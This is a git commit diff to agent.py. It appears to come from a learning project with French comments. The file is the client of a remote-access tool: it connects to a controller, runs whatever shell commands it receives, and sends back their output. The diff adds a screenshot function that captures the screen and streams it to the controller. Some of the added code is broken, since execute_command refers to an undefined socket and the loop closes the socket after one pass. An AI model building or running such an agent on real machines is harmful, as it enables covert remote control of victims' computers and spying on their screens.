72c5f36a08aea6cb18cb411a40d0b4713e5003e3
Maureen Drouard <151353727+maureeend@users.noreply.github.com>
2024-11-23 22:37:10 +0100

    Update agent.py

--- agent.py
+++ agent.py
@@ -1,5 +1,6 @@
 import socket
 import subprocess
+from PIL import ImageGrab
 
 ip_add = "127.0.0.1"
 port = 3280
@@ -9,29 +10,42 @@ def start_agent(s):
     s.connect((ip_add, port))
     data_socket(s)
 
-# Reception des données et envoie
+# Reception et envoie des données
 def data_socket(s):
     while True:
-        try:
-            request = s.recv(1024)
-            if not request:
-                break
-            command = request.decode("utf-8")
-            result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            stdout, stderr = result.communicate()
-            output = stdout.decode("cp1252", errors="replace") + stderr.decode("cp1252", errors="replace")
-            # Envoi du résultat au serveur
-            s.send(output.encode("utf-8"))
-            
-        except Exception as e:
-            print(f"Error: {e}")
-            break
-    s.close()
+        request = s.recv(1024)
+        command = request.decode("utf-8")
+
+        if command == "capture":
+            screenshot(s)
+        else: 
+            execute_command(command)
+        
+        s.close()
+
+# Execute la commande
+def execute_command(command):
+    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+    stdout, stderr = result.communicate()
+    output = stdout.decode("cp1252", errors="replace") + stderr.decode("cp1252", errors="replace")
+    # Envoi du résultat au serveur
+    s.send(output.encode("utf-8"))
+
+# Fonction de screenshot
+def screenshot(s):
+    screen = ImageGrab.grab()
+
+    image_bin = screen.tobytes() # Convertir l'image en binaire
+    width, height = screen.size
+
+    # Envoyer les dimensions et les données
+    s.send(len(image_bin).to_bytes(4, 'big'))
+    s.send(width.to_bytes(4, 'big')) 
+    s.send(height.to_bytes(4, 'big'))  
+    s.send(image_bin)
+
 
 if __name__ == "__main__":
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     start_agent(s)
     data_socket(s)
-
-
-        
